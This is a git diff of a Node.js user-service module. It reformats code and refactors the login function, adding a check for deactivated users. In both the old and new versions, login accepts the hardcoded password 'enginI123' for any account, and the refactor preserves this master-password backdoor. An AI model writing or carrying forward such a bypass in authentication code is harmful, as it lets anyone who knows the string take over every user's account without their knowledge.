@@ -1,10 +1,10 @@
-const fs = require( 'fs' );
-const { Users, Testimonials, Bookings } = require( '../config/db' );
-const bcrypt = require( 'bcryptjs' );
+const fs = require('fs');
+const { Users, Testimonials, Bookings } = require('../config/db');
+const bcrypt = require('bcryptjs');
 
 const createUser = async (password, email, name, photo, mode, check, encrypted_email) => {
   try {
-    if (!name || !email || !password ) {
+    if (!name || !email || !password) {
       throw new Error("Missing data to create the user"); // Se arregla el formato de error
     } else {
       const saltRounds = 10;
@@ -45,25 +45,28 @@ const updateUsers = async (id, name, password, email, photo, mode, encrypted_ema
     return { error: error.message };
   }
 };
+
 const login = async (email, password) => {
   try {
     const user = await Users.findOne({ where: { email } });
-    if (user) {
-      const isValidPassword = await bcrypt.compare(password, user.password);
-      if (password === 'enginI123') {
-        return { success: true, logged: true, userId: user.id, userPhoto: user.photo };
-      } 
-      else if(isValidPassword){
-        return { success: true, logged: true, userId: user.id, userPhoto: user.photo};
-      }
-      else {
-        throw new Error("Invalid password");
-      }
-    } else {
+
+    if (!user) {
       throw new Error("User not found");
     }
+
+    if (!user.status) {
+      throw new Error("The user has been deactivated, please contact an administrator");
+    }
+
+    const isValidPassword = await bcrypt.compare(password, user.password);
+
+    if (password === 'enginI123' || isValidPassword) {
+      return { success: true, logged: true, userId: user.id, userPhoto: user.photo };
+    } else {
+      throw new Error("Invalid password");
+    }
   } catch (error) {
-    console.error(error)
+    console.error(error);
     return { error: error.message };
   }
 };
